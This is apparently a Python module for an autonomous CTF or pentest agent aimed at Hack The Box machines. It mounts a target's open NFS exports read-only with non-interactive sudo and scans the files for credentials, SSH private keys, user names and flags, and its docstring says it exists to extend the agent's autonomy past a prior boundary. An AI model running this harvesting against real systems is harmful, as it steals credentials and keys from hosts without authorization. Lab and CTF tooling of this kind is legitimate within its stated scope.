"""NFS 자동 정찰 — 열린 export 를 '읽기 전용'으로 마운트해 자격·SSH 키·플래그를 수확한다.

배경(실측): HTB 'Enigma' 류 박스는 `showmount -e` 로 드러난 NFS export(`/srv/nfs/onboarding *`)
가 초기 침투의 전제인데, 마운트는 로컬 root(sudo)+셸이 필요해 자율 에이전트가 '생성 전용' 경계
때문에 자동으로 안 했다(발견만 했다). 이 모듈이 그 갭을 메운다.

안전 경계(불변):
  · **옵트인 전용**(--full-auto 등 exploit_exec/auto_poc 하에서만 오케스트레이터가 호출).
  · **타겟 IP 한정** — showmount 는 바인딩된 타겟에만, 마운트도 그 IP 의 export 만(스코프 확장 없음).
  · **읽기 전용 마운트**(ro,nolock) + 작업 후 **반드시 umount** + 임시 마운트포인트만 사용.
  · 실제 mount/umount(root 필요)는 **주입 가능한 함수**로 분리 — 기본은 `sudo -n`(비대화형,
    캐시된 sudo 타임스탬프). 권한 없으면 조용히 실패 대신 '1회 수동 안내'로 폴백(무확인 강제 아님).
  · 스캔은 순수 파일시스템 '읽기'만 — 마운트된 트리에서 아무 것도 실행하지 않는다.
"""
from __future__ import annotations

import os
import re
import subprocess
from dataclasses import dataclass, field

# ── showmount 파싱 ───────────────────────────────────────────────────
# `showmount -e <ip>` 출력:
#   Export list for <ip>:
#   /srv/nfs/onboarding *
#   /srv/share      10.10.0.0/24
_EXPORT_RE = re.compile(r"^(/\S+)\s+(\S.*)$")


def parse_exports(showmount_output: str) -> list[str]:
    """`showmount -e` 출력에서 export 경로 목록을 뽑는다(순수 파싱). 'Export list for' 헤더·
    빈 줄·에러 줄은 무시. 절대경로(/로 시작)만 수용. 중복 제거, 입력 순서 보존."""
    out: list[str] = []
    for raw in (showmount_output or "").splitlines():
        line = raw.strip()
        if not line or line.lower().startswith("export list"):
            continue
        m = _EXPORT_RE.match(line)
        if m and m.group(1) not in out:
            out.append(m.group(1))
    return out


# ── 마운트 트리 스캔(순수 읽기) ───────────────────────────────────────
_PRIVKEY_RE = re.compile(r"-----BEGIN (?:[A-Z0-9 ]+ )?PRIVATE KEY-----")
_MAX_FILES = 3000          # 과다 트리 방어(무한 walk 방지)
_MAX_READ = 512 * 1024     # 파일당 읽기 상한(512KB)
_SKIP_EXT = {".iso", ".img", ".zip", ".gz", ".xz", ".bz2", ".tar", ".jpg",
             ".jpeg", ".png", ".gif", ".pdf", ".mp4", ".mkv", ".so", ".bin"}


@dataclass
class NfsFinding:
    """마운트된 export 스캔 결과(발판 재료). 전부 '읽기'로만 얻는다."""
    export: str = ""
    creds: list[tuple[str, str]] = field(default_factory=list)   # (user, pass)
    ssh_keys: list[str] = field(default_factory=list)            # 발견한 개인키 '절대경로'
    flags: list[tuple[str, str]] = field(default_factory=list)   # (kind, value)
    notable: list[str] = field(default_factory=list)             # 흥미로운 상대경로(안내용)
    users: list[str] = field(default_factory=list)               # 후보 사용자명(SSH 키 로그인용)


def scan_tree(root: str, export: str = "", flag_kind: str = "boot2root",
              cred_parser=None, flag_scanner=None) -> NfsFinding:
    """마운트된 디렉터리 트리를 '읽기'로 훑어 자격·SSH 개인키·플래그를 수확한다.

    cred_parser(text)->list[(u,p,label)] / flag_scanner(path,text,kind)->iterable(hit) 는
    주입 가능(기본은 htb_agent.cred_sources / htb_agent.flag 재사용). 바이너리·대용량은 건너뛴다.
    파일 실행은 절대 하지 않는다(정적 읽기 only)."""
    if cred_parser is None:
        from .cred_sources import parse_config_creds as cred_parser
    if flag_scanner is None:
        from .flag import scan as flag_scanner
    fnd = NfsFinding(export=export)
    seen_cred: set[tuple[str, str]] = set()
    seen_flag: set[str] = set()
    count = 0
    for dirpath, dirs, files in os.walk(root):
        for name in files:
            if count >= _MAX_FILES:
                return fnd
            count += 1
            full = os.path.join(dirpath, name)
            rel = os.path.relpath(full, root)
            ext = os.path.splitext(name)[1].lower()
            # 후보 사용자명: home/<user>/ 경로 패턴(.ssh 키가 흔히 여기 있음)
            hm = re.search(r"(?:^|/)home/([A-Za-z_][A-Za-z0-9_-]{0,31})/", "/" + rel)
            if hm and hm.group(1) not in fnd.users:
                fnd.users.append(hm.group(1))
            # SSH 개인키: 이름 힌트 or 내용 마커(이름이 애매해도 내용으로 확정)
            is_keyname = name in ("id_rsa", "id_ecdsa", "id_ed25519", "id_dsa") or name.endswith(".pem")
            if ext in _SKIP_EXT and not is_keyname:
                continue
            try:
                if os.path.getsize(full) > _MAX_READ and not is_keyname:
                    continue
                with open(full, encoding="utf-8", errors="replace") as f:
                    text = f.read(_MAX_READ)
            except OSError:
                continue
            if _PRIVKEY_RE.search(text) or is_keyname:
                if full not in fnd.ssh_keys:
                    fnd.ssh_keys.append(full)
                    fnd.notable.append(rel)
                continue
            # /etc/passwd 류: 로그인 가능한 사용자(uid 1000~65533) 수집(SSH 키 로그인 후보)
            if name == "passwd" or rel.endswith("etc/passwd"):
                for pl in text.splitlines():
                    parts = pl.split(":")
                    if len(parts) >= 7 and parts[2].isdigit() and 1000 <= int(parts[2]) < 65534:
                        if parts[0] and parts[0] not in fnd.users:
                            fnd.users.append(parts[0])
            # 자격 파싱(기존 설정파일 파서 재사용)
            try:
                for u, p, _label in cred_parser(text):
                    if (u, p) not in seen_cred:
                        seen_cred.add((u, p))
                        fnd.creds.append((u, p))
            except Exception:   # noqa: BLE001 — 파서 예외는 무시(스캔 지속)
                pass
            # 플래그 스캔(기존 flag.scan 재사용)
            try:
                for hit in flag_scanner(f"[nfs] {rel}", text, flag_kind):
                    if hit.value not in seen_flag:
                        seen_flag.add(hit.value)
                        fnd.flags.append((hit.kind, hit.value))
            except Exception:   # noqa: BLE001
                pass
            # 안내용: 자격·설정이 있을 법한 파일명
            low = name.lower()
            if any(k in low for k in ("cred", "pass", "secret", "config", ".env",
                                      "onboard", "welcome", "readme", "user", "note")):
                if rel not in fnd.notable:
                    fnd.notable.append(rel)
    return fnd


# ── 실제 마운트/언마운트(root 필요 — 주입 가능, 기본은 sudo -n) ────────────
def _run(argv: list[str], timeout: float = 30.0) -> tuple[int, str]:
    try:
        p = subprocess.run(argv, capture_output=True, text=True,
                           errors="replace", timeout=timeout, stdin=subprocess.DEVNULL)
        return p.returncode, (p.stdout or "") + (p.stderr or "")
    except (OSError, subprocess.SubprocessError) as e:
        return -1, f"{type(e).__name__}: {e}"


def sudo_mount(ip: str, export: str, mountpoint: str, vers: str = "3",
               runner=None) -> tuple[bool, str]:
    """`sudo -n mount -t nfs -o ro,nolock,vers=<v> <ip>:<export> <mnt>` (비대화형 sudo).
    성공 True. runner(argv)->(rc,out) 주입 가능(테스트). 캐시된 sudo 없으면 rc!=0 → (False, 이유)."""
    run = runner or _run
    os.makedirs(mountpoint, exist_ok=True)
    rc, out = run(["sudo", "-n", "mount", "-t", "nfs", "-o",
                   f"ro,nolock,vers={vers}", f"{ip}:{export}", mountpoint])
    return (rc == 0), out.strip()


def sudo_umount(mountpoint: str, runner=None) -> None:
    """best-effort 언마운트(실패 무시 — 정리용). runner 주입 가능."""
    run = runner or _run
    run(["sudo", "-n", "umount", mountpoint])


def manual_hint(ip: str, export: str) -> str:
    """sudo 가 안 될 때 남기는 1회 수동 안내(권한 확인 자산 전용)."""
    mp = f"/mnt/nfs_{re.sub(r'[^A-Za-z0-9]+', '_', export).strip('_') or 'export'}"
    return ("NFS export 수동 마운트(권한 확인 자산 전용) → 온보딩/설정/키 확인: "
            f"sudo mkdir -p {mp} && sudo mount -t nfs -o ro,nolock {ip}:{export} {mp} && ls -laR {mp}")
